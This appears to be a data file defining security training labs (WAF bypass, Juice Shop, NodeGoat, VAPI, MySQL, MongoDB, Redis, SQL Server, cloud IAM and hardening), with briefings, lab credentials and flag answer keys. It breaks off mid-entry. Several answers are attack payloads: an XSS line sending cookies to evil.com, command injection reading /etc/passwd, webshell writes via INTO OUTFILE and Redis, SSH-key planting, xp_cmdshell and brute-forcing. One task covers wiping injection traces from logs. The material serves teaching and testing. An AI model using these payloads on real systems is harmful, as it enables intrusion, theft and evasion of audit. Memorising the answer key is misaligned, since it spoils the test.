    tasks: ["Identify WAF type and version through fingerprinting", "Bypass SQL injection filters using URL encoding and case variation", "Use HTTP parameter pollution to evade WAF inspection", "Exploit chunked transfer encoding to fragment malicious payloads", "Bypass keyword filters using inline comments", "Use Unicode and overlong UTF-8 encoding to bypass filters", "Exploit parser differentials between WAF and backend application", "Document bypass techniques and recommend WAF rule improvements"],
    credentials: [
      { service: "container", username: "waf-test", password: "waf-bypass-2024!" }
    ],
    flags: [
      { title: "WAF Finger", description: "Identify WAF type", correctAnswer: "wafw00f http://target", points: 100 },
      { title: "Encoding Bypasser", description: "Bypass with URL encoding", correctAnswer: "%27%20OR%201%3D1--", points: 200 },
      { title: "HPP Exploiter", description: "HTTP parameter pollution", correctAnswer: "?id=1&id=' OR 1=1--", points: 200 },
      { title: "Chunked Splitter", description: "Use chunked encoding", correctAnswer: "Transfer-Encoding: chunked", points: 200 },
      { title: "Unicode Mixer", description: "Bypass with Unicode", correctAnswer: "%u0027 OR %u0031=%u0031--", points: 200 }
    ],
  },
  {
    title: "Juice Shop: Advanced Challenges",
    description: "Complete advanced OWASP Juice Shop challenges involving cryptographic attacks and business logic.",
    dockerImage: "bkimminich/juice-shop",
    difficulty: 1350,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Solve advanced security challenges including JWT manipulation, cryptographic weaknesses, and business logic flaws.

### Environment
- Juice Shop application with all challenges enabled
- Burp Suite or equivalent interception proxy
- Credentials: admin@juice-sh.op / admin123

### Tasks
1. Perform JWT key cracking using available wordlists
2. Exploit a cryptographic weakness in the password hashing
3. Bypass paywall by manipulating the payment transaction
4. Perform a supply chain attack through a poisoned dependency
5. Find and exploit a vulnerability in the two-factor authentication
6. Chain multiple low-severity vulnerabilities for high impact
7. Abuse a CI/CD pipeline vulnerability through the application
8. Document the complete attack chain for each advanced challenge

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Perform JWT key cracking using available wordlists", "Exploit a cryptographic weakness in the password hashing", "Bypass paywall by manipulating the payment transaction", "Perform a supply chain attack through a poisoned dependency", "Find and exploit a vulnerability in the two-factor authentication", "Chain multiple low-severity vulnerabilities for high impact", "Abuse a CI/CD pipeline vulnerability through the application", "Document the complete attack chain for each advanced challenge"],
    credentials: [
      { service: "ssh", username: "admin", password: "admin123" }
    ],
    flags: [
      { title: "JWT Cracker", description: "Crack JWT secret key", correctAnswer: "hashcat -m 16500 jwt.txt wordlist.txt", points: 250 },
      { title: "Paywall Bypasser", description: "Bypass payment with negative amount", correctAnswer: "PUT /api/BasketItems/1 {quantity: -1000}", points: 250 },
      { title: "2FA Bypasser", description: "Bypass 2FA verification", correctAnswer: "GET /api/2fa/status?token=<forged>", points: 300 },
      { title: "Chain Master", description: "Chain 3+ vulnerabilities", correctAnswer: "SSRF -> Internal API -> Privilege Escalation", points: 300 },
      { title: "Dep Poisoner", description: "Identify poisoned dependency", correctAnswer: "npm audit --json", points: 200 }
    ],
  },
  {
    title: "NodeGoat: Node.js Security Vulnerabilities",
    description: "Exploit security vulnerabilities specific to Node.js applications using NodeGoat.",
    dockerImage: "1njected/nodegoat",
    difficulty: 1400,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Identify and exploit OWASP Top 10 vulnerabilities in a Node.js/MongoDB application environment.

### Environment
- NodeGoat application with MongoDB backend
- Browser for web-based testing
- Credentials: user / user123

### Tasks
1. Exploit NoSQL injection in the login form
2. Perform prototype pollution to modify application behavior
3. Chain stored XSS with session hijacking in the dashboard
4. Exploit insecure direct object reference in the profile API
5. Perform command injection through the backup utility
6. Abuse weak session generation for session fixation
7. Exploit MongoDB operator injection to bypass authentication
8. Remediate vulnerabilities using secure coding practices

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Exploit NoSQL injection in the login form", "Perform prototype pollution to modify application behavior", "Chain stored XSS with session hijacking in the dashboard", "Exploit insecure direct object reference in the profile API", "Perform command injection through the backup utility", "Abuse weak session generation for session fixation", "Exploit MongoDB operator injection to bypass authentication", "Remediate vulnerabilities using secure coding practices"],
    credentials: [
      { service: "ssh", username: "user", password: "user123" }
    ],
    flags: [
      { title: "NoSQL Injector", description: "NoSQL injection in login", correctAnswer: "{username:admin,password:{$gt:''}}", points: 200 },
      { title: "Proto Polluter", description: "Prototype pollution attack", correctAnswer: "{__proto__:{admin:true}}", points: 250 },
      { title: "XSS Hijacker", description: "XSS session hijacking", correctAnswer: "<script>new Image().src='http://evil.com/?s='+document.cookie</script>", points: 250 },
      { title: "IDOR Abuser", description: "Access other user profiles", correctAnswer: "/api/users/2", points: 200 },
      { title: "Cmd Injector", description: "Command injection via backup", correctAnswer: "; cat /etc/passwd", points: 300 }
    ],
  },
  {
    title: "VAPI: Vulnerable API Penetration Testing",
    description: "Perform penetration testing on intentionally vulnerable REST APIs using VAPI.",
    dockerImage: "roottusk/vapi",
    difficulty: 1500,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Test a vulnerable API for OWASP API Security Top 10 vulnerabilities including broken auth and excessive data exposure.

### Environment
- VAPI (Vulnerable API) running on port 3000
- Postman, curl, or Burp Suite for testing
- Credentials: admin / admin123

### Tasks
1. Enumerate API endpoints through documentation endpoints
2. Exploit broken authentication to access other accounts
3. Perform mass assignment to escalate privileges
4. Exploit BOLA/IDOR to access unauthorized resources
5. Test for excessive data exposure in API responses
6. Bypass rate limiting using API versioning endpoints
7. Exploit function level access control bypass
8. Document all vulnerabilities following OWASP API Top 10

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Enumerate API endpoints through documentation endpoints", "Exploit broken authentication to access other accounts", "Perform mass assignment to escalate privileges", "Exploit BOLA/IDOR to access unauthorized resources", "Test for excessive data exposure in API responses", "Bypass rate limiting using API versioning endpoints", "Exploit function level access control bypass", "Document all vulnerabilities following OWASP API Top 10"],
    credentials: [
      { service: "ssh", username: "admin", password: "admin123" }
    ],
    flags: [
      { title: "API Enumeratior", description: "Discover all API endpoints", correctAnswer: "curl http://localhost:3000/swagger.json", points: 100 },
      { title: "Auth Bypasser", description: "Bypass authentication", correctAnswer: "curl -H 'Authorization: Bearer <forged-jwt>' /api/users", points: 250 },
      { title: "Mass Assigner", description: "Escalate via mass assignment", correctAnswer: "{name:user,role:admin}", points: 200 },
      { title: "BOLA Finder", description: "Access unauthorized resources", correctAnswer: "/api/v1/users/123/orders", points: 200 },
      { title: "Rate Limiter", description: "Bypass rate limiting", correctAnswer: "X-Forwarded-For: 127.0.0.1", points: 200 }
    ],
  },
  {
    title: "PostgreSQL Security Hardening",
    description: "Harden PostgreSQL database instances against common attack vectors.",
    dockerImage: "postgres:15-alpine",
    difficulty: 800,
    estimatedMinutes: 60,
    briefing: `### Mission Objective
Secure PostgreSQL by implementing authentication controls, encryption, and access restrictions.

### Environment
- PostgreSQL 15 Alpine container
- pg_hba.conf, postgresql.conf
- Credentials: postgres / pg-harden-2024!

### Tasks
1. Configure pg_hba.conf to restrict authentication methods
2. Enable SSL/TLS for client connections
3. Create roles with least-privilege permissions
4. Set up row-level security policies
5. Enable audit logging for all DDL and DML operations
6. Configure connection limits per user and database
7. Harden shared_buffers and memory settings
8. Test that unauthorized access is properly denied

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Configure pg_hba.conf to restrict authentication methods", "Enable SSL/TLS for client connections", "Create roles with least-privilege permissions", "Set up row-level security policies", "Enable audit logging for all DDL and DML operations", "Configure connection limits per user and database", "Harden shared_buffers and memory settings", "Test that unauthorized access is properly denied"],
    credentials: [
      { service: "container", username: "postgres", password: "pg-harden-2024!" }
    ],
    flags: [
      { title: "HBA Hardener", description: "Configure pg_hba.conf restrictions", correctAnswer: "host all all 127.0.0.1/32 scram-sha-256", points: 150 },
      { title: "SSL Enabler", description: "Enable SSL connections", correctAnswer: "ssl = on", points: 150 },
      { title: "Role Creator", description: "Create restricted role", correctAnswer: "CREATE ROLE readonly WITH LOGIN PASSWORD 'pass'; GRANT CONNECT ON DATABASE app TO readonly;", points: 200 },
      { title: "RLS Policy", description: "Set up row-level security", correctAnswer: "ALTER TABLE users ENABLE ROW LEVEL SECURITY; CREATE POLICY user_isolation ON users USING (current_user = username);", points: 250 },
      { title: "Audit Logger", description: "Enable pgAudit logging", correctAnswer: "shared_preload_libraries = 'pgaudit'", points: 150 }
    ],
  },
  {
    title: "MySQL Injection & Privilege Escalation",
    description: "Exploit MySQL-specific injection techniques and escalate database privileges.",
    dockerImage: "ubuntu:22.04",
    difficulty: 900,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Master MySQL-specific SQL injection techniques including stacked queries, file operations, and privilege escalation.

### Environment
- Ubuntu 22.04 with MySQL 8
- Web application with MySQL backend
- Credentials: root / mysql-esc-2024!

### Tasks
1. Perform MySQL-specific UNION injection to enumerate databases
2. Use LOAD_FILE() to read sensitive system files
3. Exploit INTO OUTFILE to write a webshell to disk
4. Escalate MySQL user privileges using GRANT escalation
5. Extract password hashes from the mysql.user table
6. Use information_schema to map the complete database structure
7. Bypass MySQL WAF using inline comments and encoding
8. Remove injection traces from MySQL general log

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Perform MySQL-specific UNION injection to enumerate databases", "Use LOAD_FILE() to read sensitive system files", "Exploit INTO OUTFILE to write a webshell to disk", "Escalate MySQL user privileges using GRANT escalation", "Extract password hashes from the mysql.user table", "Use information_schema to map the complete database structure", "Bypass MySQL WAF using inline comments and encoding", "Remove injection traces from MySQL general log"],
    credentials: [
      { service: "container", username: "root", password: "mysql-esc-2024!" }
    ],
    flags: [
      { title: "DB Enumerator", description: "Enumerate databases via injection", correctAnswer: "' UNION SELECT schema_name FROM information_schema.schemata--", points: 150 },
      { title: "File Reader", description: "Read files with LOAD_FILE", correctAnswer: "' UNION SELECT LOAD_FILE('/etc/passwd')--", points: 200 },
      { title: "Shell Writer", description: "Write webshell via INTO OUTFILE", correctAnswer: "' UNION SELECT '<php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php'--", points: 250 },
      { title: "Privilege Escalator", description: "Escalate to DBA privileges", correctAnswer: "GRANT ALL PRIVILEGES ON *.* TO 'lowuser'@'%' WITH GRANT OPTION;", points: 250 },
      { title: "Hash Extractor", description: "Extract password hashes", correctAnswer: "' UNION SELECT user, authentication_string FROM mysql.user--", points: 200 }
    ],
  },
  {
    title: "MongoDB NoSQL Injection & Security",
    description: "Identify and exploit NoSQL injection vulnerabilities in MongoDB-backed applications.",
    dockerImage: "mongo:4.4",
    difficulty: 950,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Exploit MongoDB operator injection, field injection, and prototype pollution in NoSQL applications.

### Environment
- MongoDB 4.4 with a vulnerable Node.js application
- mongo shell for direct queries
- Credentials: admin / mongo-inj-2024!

### Tasks
1. Perform MongoDB operator injection ($gt, $ne, $regex) to bypass authentication
2. Exploit field injection to modify query conditions
3. Use $where operator injection for JavaScript execution
4. Extract data through regex-based blind NoSQL injection
5. Chain prototype pollution with NoSQL injection
6. Exploit aggregation pipeline injection
7. Test for MongoDB authentication bypass vulnerabilities
8. Implement parameterized queries to prevent NoSQL injection

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Perform MongoDB operator injection ($gt, $ne, $regex) to bypass authentication", "Exploit field injection to modify query conditions", "Use $where operator injection for JavaScript execution", "Extract data through regex-based blind NoSQL injection", "Chain prototype pollution with NoSQL injection", "Exploit aggregation pipeline injection", "Test for MongoDB authentication bypass vulnerabilities", "Implement parameterized queries to prevent NoSQL injection"],
    credentials: [
      { service: "container", username: "admin", password: "mongo-inj-2024!" }
    ],
    flags: [
      { title: "Operator Injector", description: "Bypass auth with $gt operator", correctAnswer: "{username:admin,password:{$gt:''}}", points: 200 },
      { title: "Regex Extractor", description: "Blind injection with regex", correctAnswer: "{username:admin,password:{$regex:'^a'}}", points: 200 },
      { title: "Where Injector", description: "JavaScript injection via $where", correctAnswer: "{$where:'this.password == this.confirmPassword'}", points: 250 },
      { title: "Field Modifier", description: "Inject additional query fields", correctAnswer: "{username:admin,$or:[{password:pass},{role:admin}]}", points: 200 },
      { title: "Pipeline Injector", description: "Aggregation pipeline injection", correctAnswer: "[{$match:{role:admin}}]", points: 200 }
    ],
  },
  {
    title: "Redis Exploitation & Hardening",
    description: "Exploit misconfigured Redis instances and implement security hardening.",
    dockerImage: "redis:7-alpine",
    difficulty: 1000,
    estimatedMinutes: 60,
    briefing: `### Mission Objective
Exploit Redis commands for unauthorized access, data extraction, and remote code execution.

### Environment
- Redis 7 Alpine container
- redis-cli for testing
- Credentials: redis / redis-exploit-2024!

### Tasks
1. Connect to Redis without authentication and enumerate keys
2. Exploit Redis to write SSH keys to authorized_keys
3. Use Redis CONFIG SET to write a webshell to disk
4. Extract sensitive data from Redis databases
5. Exploit Lua scripting engine for command execution
6. Configure Redis authentication with requirepass
7. Set up Redis ACLs for least-privilege access
8. Enable TLS for Redis client connections

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Connect to Redis without authentication and enumerate keys", "Exploit Redis to write SSH keys to authorized_keys", "Use Redis CONFIG SET to write a webshell to disk", "Extract sensitive data from Redis databases", "Exploit Lua scripting engine for command execution", "Configure Redis authentication with requirepass", "Set up Redis ACLs for least-privilege access", "Enable TLS for Redis client connections"],
    credentials: [
      { service: "container", username: "redis", password: "redis-exploit-2024!" }
    ],
    flags: [
      { title: "Key Enumerator", description: "Enumerate all Redis keys", correctAnswer: "redis-cli KEYS '*'", points: 100 },
      { title: "SSH Writer", description: "Write SSH key via Redis", correctAnswer: "redis-cli CONFIG SET dir /root/.ssh && redis-cli CONFIG SET dbfilename authorized_keys && redis-cli SAVE", points: 250 },
      { title: "Shell Dropper", description: "Write webshell via Redis", correctAnswer: "redis-cli CONFIG SET dir /var/www/html && redis-cli CONFIG SET dbfilename shell.php && redis-cli SAVE", points: 250 },
      { title: "Data Extractor", description: "Extract sensitive Redis data", correctAnswer: "redis-cli --no-auth-warning -a redis GET sensitive:token", points: 150 },
      { title: "Lua Exploiter", description: "Execute commands via Lua", correctAnswer: "redis-cli EVAL \"return redis.call('INFO','server')\" 0", points: 200 }
    ],
  },
  {
    title: "Database Backup & Recovery Security",
    description: "Secure database backup processes and test recovery procedures for data integrity.",
    dockerImage: "postgres:15-alpine",
    difficulty: 1050,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Implement encrypted database backups, verify integrity, and test disaster recovery procedures.

### Environment
- PostgreSQL 15 with sample data
- Backup utilities: pg_dump, pg_basebackup
- Credentials: postgres / backup-sec-2024!

### Tasks
1. Perform encrypted pg_dump with GPG encryption
2. Create incremental backups using WAL archiving
3. Verify backup integrity with checksums
4. Test point-in-time recovery (PITR) from WAL files
5. Implement automated backup rotation and retention policies
6. Secure backup storage with proper file permissions and encryption
7. Test recovery to a different server to verify portability
8. Audit backup logs for completeness and tampering

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Perform encrypted pg_dump with GPG encryption", "Create incremental backups using WAL archiving", "Verify backup integrity with checksums", "Test point-in-time recovery (PITR) from WAL files", "Implement automated backup rotation and retention policies", "Secure backup storage with proper file permissions and encryption", "Test recovery to a different server to verify portability", "Audit backup logs for completeness and tampering"],
    credentials: [
      { service: "container", username: "postgres", password: "backup-sec-2024!" }
    ],
    flags: [
      { title: "Encrypted Dumper", description: "Create encrypted backup", correctAnswer: "pg_dumpall | gpg --symmetric --cipher-algo AES256 -o backup.sql.gpg", points: 200 },
      { title: "WAL Archiver", description: "Enable WAL archiving", correctAnswer: "archive_mode = on", points: 200 },
      { title: "Checksum Verifier", description: "Verify backup integrity", correctAnswer: "sha256sum backup.sql.gpg", points: 100 },
      { title: "PITR Restorer", description: "Perform point-in-time recovery", correctAnswer: "recovery_target_time = '2024-01-15 10:30:00'", points: 250 },
      { title: "Permission Securer", description: "Secure backup file permissions", correctAnswer: "chmod 600 /backups/*.gpg && chown postgres:postgres /backups/*.gpg", points: 100 }
    ],
  },
  {
    title: "SQL Server Authentication Bypass",
    description: "Test and exploit SQL Server authentication mechanisms and misconfigurations.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1100,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Identify SQL Server authentication weaknesses including weak passwords, excessive permissions, and linked servers.

### Environment
- Ubuntu 22.04 with SQL Server or compatible
- sqlcmd, mssql-cli tools
- Credentials: sa / sql-bypass-2024!

### Tasks
1. Enumerate SQL Server authentication modes (Windows vs Mixed)
2. Brute-force weak SA password using common password lists
3. Exploit xp_cmdshell for operating system command execution
4. Discover and abuse linked servers for lateral movement
5. Extract credentials from sys.sql_logins and master.dbo.syslogins
6. Use OPENROWSET to access external database servers
7. Audit and remove excessive database permissions
8. Implement SQL Server security best practices

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Enumerate SQL Server authentication modes (Windows vs Mixed)", "Brute-force weak SA password using common password lists", "Exploit xp_cmdshell for operating system command execution", "Discover and abuse linked servers for lateral movement", "Extract credentials from sys.sql_logins and master.dbo.syslogins", "Use OPENROWSET to access external database servers", "Audit and remove excessive database permissions", "Implement SQL Server security best practices"],
    credentials: [
      { service: "container", username: "sa", password: "sql-bypass-2024!" }
    ],
    flags: [
      { title: "Mode Finder", description: "Check authentication mode", correctAnswer: "SELECT SERVERPROPERTY('IsIntegratedSecurityOnly');", points: 100 },
      { title: "SA Bruter", description: "Brute-force SA password", correctAnswer: "hydra -l sa -P passwords.txt mssql://target", points: 200 },
      { title: "Shell Executer", description: "Enable and use xp_cmdshell", correctAnswer: "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';", points: 250 },
      { title: "Link Explorer", description: "Discover linked servers", correctAnswer: "SELECT * FROM sys.servers;", points: 200 },
      { title: "Credential Extractor", description: "Extract login hashes", correctAnswer: "SELECT name, password_hash FROM sys.sql_logins;", points: 200 }
    ],
  },
  {
    title: "Database Encryption at Rest & in Transit",
    description: "Implement transparent data encryption, column-level encryption, and TLS for database connections.",
    dockerImage: "postgres:15-alpine",
    difficulty: 1150,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Deploy encryption solutions for PostgreSQL including pgcrypto, SSL/TLS, and encrypted backups.

### Environment
- PostgreSQL 15 with pgcrypto extension
- SSL certificate infrastructure
- Credentials: postgres / dbenc-2024!

### Tasks
1. Enable pgcrypto extension for column-level encryption
2. Encrypt sensitive columns (SSN, credit card) using pgp_sym_encrypt
3. Configure SSL/TLS certificates for client-server connections
4. Implement Transparent Data Encryption (TDE) concepts
5. Create encrypted database views for authorized users only
6. Set up key management procedures for encryption keys
7. Verify encryption is active using pg_stat_ssl
8. Test that encrypted data is unreadable without proper keys

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Enable pgcrypto extension for column-level encryption", "Encrypt sensitive columns (SSN, credit card) using pgp_sym_encrypt", "Configure SSL/TLS certificates for client-server connections", "Implement Transparent Data Encryption (TDE) concepts", "Create encrypted database views for authorized users only", "Set up key management procedures for encryption keys", "Verify encryption is active using pg_stat_ssl", "Test that encrypted data is unreadable without proper keys"],
    credentials: [
      { service: "container", username: "postgres", password: "dbenc-2024!" }
    ],
    flags: [
      { title: "Crypto Enabler", description: "Enable pgcrypto extension", correctAnswer: "CREATE EXTENSION IF NOT EXISTS pgcrypto;", points: 100 },
      { title: "Column Encryptor", description: "Encrypt sensitive column data", correctAnswer: "INSERT INTO users (ssn) VALUES (pgp_sym_encrypt('123-45-6789', 'key123'));", points: 200 },
      { title: "Column Decryptor", description: "Decrypt column data", correctAnswer: "SELECT pgp_sym_decrypt(ssn_enc, 'key123') FROM users;", points: 200 },
      { title: "SSL Configurator", description: "Configure SSL connections", correctAnswer: "ssl_cert_file = '/etc/ssl/server.crt' AND ssl_key_file = '/etc/ssl/server.key'", points: 200 },
      { title: "SSL Verifier", description: "Verify active SSL connections", correctAnswer: "SELECT * FROM pg_stat_ssl WHERE ssl = true;", points: 150 }
    ],
  },
  {
    title: "Elasticsearch Security Configuration",
    description: "Secure Elasticsearch clusters with authentication, authorization, and encryption.",
    dockerImage: "elasticsearch:7.17.17",
    difficulty: 1200,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Configure Elasticsearch security features including X-Pack, TLS, and role-based access control.

### Environment
- Elasticsearch 7.17 with X-Pack security
- Kibana for management UI
- Credentials: elastic / es-sec-2024!

### Tasks
1. Enable X-Pack security and set up built-in users
2. Configure TLS for inter-node communication (transport layer)
3. Create custom roles with specific index permissions
4. Set up API keys for application-level access
5. Configure audit logging for all cluster events
6. Implement field and document level security
7. Set up SAML/OIDC authentication for Kibana
8. Test that unauthorized access is properly blocked

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Enable X-Pack security and set up built-in users", "Configure TLS for inter-node communication (transport layer)", "Create custom roles with specific index permissions", "Set up API keys for application-level access", "Configure audit logging for all cluster events", "Implement field and document level security", "Set up SAML/OIDC authentication for Kibana", "Test that unauthorized access is properly blocked"],
    credentials: [
      { service: "container", username: "elastic", password: "es-sec-2024!" }
    ],
    flags: [
      { title: "XPack Enabler", description: "Enable X-Pack security", correctAnswer: "xpack.security.enabled: true", points: 150 },
      { title: "Role Creator", description: "Create custom role", correctAnswer: "POST /_security/role/read_only {indices:[{names:['logs-*'],privileges:['read']}]}", points: 200 },
      { title: "API Key Generator", description: "Create API key", correctAnswer: "POST /_security/api_key {name:app-key,role_descriptors:{log_reader:{indices:[{names:['logs-*'],privileges:['read']}]}}}", points: 200 },
      { title: "Audit Logger", description: "Enable audit logging", correctAnswer: "xpack.security.audit.enabled: true", points: 150 },
      { title: "TLS Configurator", description: "Configure transport TLS", correctAnswer: "xpack.security.transport.ssl.enabled: true", points: 200 }
    ],
  },
{
    title: "AWS IAM Security & Policy Analysis",
    description: "Analyze and exploit misconfigured AWS IAM policies and roles.",
    dockerImage: "ubuntu:22.04",
    difficulty: 800,
    estimatedMinutes: 60,
    briefing: `### Mission Objective
Identify overly permissive IAM policies, exploit cross-account roles, and implement least-privilege access.

### Environment
- Ubuntu 22.04 with AWS CLI configured
- aws-cli v2, jq
- Credentials: aws-dev / iam-sec-2024!

### Tasks
1. Enumerate all IAM users, roles, and policies using AWS CLI
2. Identify policies with Action: * and Resource: * (full admin access)
3. Exploit cross-account role assumption to access resources in another account
4. Test IAM policy boundaries by attempting restricted actions
5. Use iam:PassRole to escalate privileges through EC2 instance roles
6. Audit access keys for unused or overly permissive credentials
7. Implement AWS SCP (Service Control Policies) to restrict account-level actions
8. Generate an IAM security assessment report

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Enumerate all IAM users, roles, and policies using AWS CLI", "Identify policies with Action: * and Resource: * (full admin access)", "Exploit cross-account role assumption to access resources in another account", "Test IAM policy boundaries by attempting restricted actions", "Use iam:PassRole to escalate privileges through EC2 instance roles", "Audit access keys for unused or overly permissive credentials", "Implement AWS SCP (Service Control Policies) to restrict account-level actions", "Generate an IAM security assessment report"],
    credentials: [
      { service: "container", username: "aws-dev", password: "iam-sec-2024!"}
    ],
    flags: [
      { title: "IAM Enumerator", description: "List all IAM entities", correctAnswer: "aws iam list-users --output table", points: 100},
      { title: "Policy Analyzer", description: "Find overly permissive policies", correctAnswer: "aws iam get-policies --query 'Policies[?PolicyName==AdminAccess]'", points: 200},
      { title: "Role Assumer", description: "Assume cross-account role", correctAnswer: "aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/CrossAccount --role-session-name exploit", points: 250},
      { title: "PassRole Exploiter", description: "Escalate via iam:PassRole", correctAnswer: "aws iam create-access-key --user-name target-user", points: 200},
      { title: "Key Auditor", description: "Find unused access keys", correctAnswer: "aws iam generate-credential-report && aws iam get-credential-report", points: 150}
    ],
  },
  {
    title: "Azure Security Center & Defender",
    description: "Configure Azure Security Center and respond to security alerts using Defender.",
    dockerImage: "ubuntu:22.04",
    difficulty: 900,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Enable Azure Defender, investigate security alerts, and implement remediation playbooks.

### Environment
- Ubuntu 22.04 with Azure CLI
- azure-cli, az security module
- Credentials: azure-dev / azure-sec-2024!

### Tasks
1. Enable Azure Security Center on a subscription
2. Activate Microsoft Defender for Cloud on all resource types
3. Investigate a simulated security alert for suspicious login activity
4. Create an automated remediation playbook using Logic Apps
5. Configure Just-in-Time (JIT) VM access for management ports
6. Implement Azure Policy for compliance monitoring
7. Review Secure Score recommendations and implement top 5 fixes
8. Export security findings to Azure Sentinel for SIEM integration

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Enable Azure Security Center on a subscription", "Activate Microsoft Defender for Cloud on all resource types", "Investigate a simulated security alert for suspicious login activity", "Create an automated remediation playbook using Logic Apps", "Configure Just-in-Time (JIT) VM access for management ports", "Implement Azure Policy for compliance monitoring", "Review Secure Score recommendations and implement top 5 fixes", "Export security findings to Azure Sentinel for SIEM integration"],
    credentials: [
      { service: "container", username: "azure-dev", password: "azure-sec-2024!"}
    ],
    flags: [
      { title: "Defender Enabler", description: "Enable Microsoft Defender", correctAnswer: "az security pricing create -n Default --tier Standard", points: 150},
      { title: "Alert Investigator", description: "Investigate security alert", correctAnswer: "az security alerts list --resource-group myRG", points: 200},
      { title: "JIT Configurer", description: "Configure JIT VM access", correctAnswer: "az security sub-task-configuration list --location westus2", points: 200},
      { title: "Policy Assigner", description: "Assign compliance policy", correctAnswer: "az policy assignment create --policy /providers/Microsoft.Authorization/policyDefinitions/ComputeAuditVMDiskEncryption --name audit-vm-disk", points: 200},
      { title: "Score Improver", description: "Implement Secure Score recommendation", correctAnswer: "az security secure-scores list --query 'value[?percentage<50]'", points: 200}
    ],
  },
  {
    title: "GCP Security Command Center",
    description: "Use Google Cloud Security Command Center to detect and respond to threats.",
    dockerImage: "ubuntu:22.04",
    difficulty: 950,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Leverage SCC for threat detection, vulnerability scanning, and security posture management in GCP.

### Environment
- Ubuntu 22.04 with gcloud CLI
- gcloud SDK with security module
- Credentials: gcp-dev / gcp-sec-2024!

### Tasks
1. Enable Security Command Center Premium on a GCP project
2. Configure event threat detection for Compute Engine
3. Review and triage findings from vulnerability scan
4. Create a custom SCC notification to Pub/Sub for critical findings
5. Implement SCC security health analytics for IAM misconfigurations
6. Use Web Security Scanner to test a deployed web application
7. Configure Access Transparency for admin activity logging
8. Create a security dashboard using SCC API exports

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Enable Security Command Center Premium on a GCP project", "Configure event threat detection for Compute Engine", "Review and triage findings from vulnerability scan", "Create a custom SCC notification to Pub/Sub for critical findings", "Implement SCC security health analytics for IAM misconfigurations", "Use Web Security Scanner to test a deployed web application", "Configure Access Transparency for admin activity logging", "Create a security dashboard using SCC API exports"],
    credentials: [
      { service: "container", username: "gcp-dev", password: "gcp-sec-2024!"}
    ],
    flags: [
      { title: "SCC Enabler", description: "Enable Security Command Center", correctAnswer: "gcloud scc settings update organizations/ORG_ID --enable-asset-discovery", points: 150},
      { title: "Threat Detector", description: "Configure event threat detection", correctAnswer: "gcloud scc settings update --enable-ctd", points: 200},
      { title: "Finding Triage", description: "Review SCC findings", correctAnswer: "gcloud scc findings list organizations/ORG --filter='state=OPEN AND severity=HIGH'", points: 200},
      { title: "Notifier Creator", description: "Create SCC notification config", correctAnswer: "gcloud scc notifications create --pubsub-topic projects/PROJECT/topics/scc-alerts", points: 200},
      { title: "Web Scanner", description: "Run Web Security Scanner", correctAnswer: "gcloud app web-scanner scan --urls=https://myapp.appspot.com", points: 150}
    ],
  },
  {
    title: "Container Image Scanning & Registry Security",
    description: "Secure container registries by implementing image scanning, signing, and access controls.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1000,
    estimatedMinutes: 60,
    briefing: `### Mission Objective
Deploy container image scanning, implement image signing with Cosign, and harden registry configurations.

### Environment
- Ubuntu 22.04 with Docker and Trivy
- Cosign for image signing
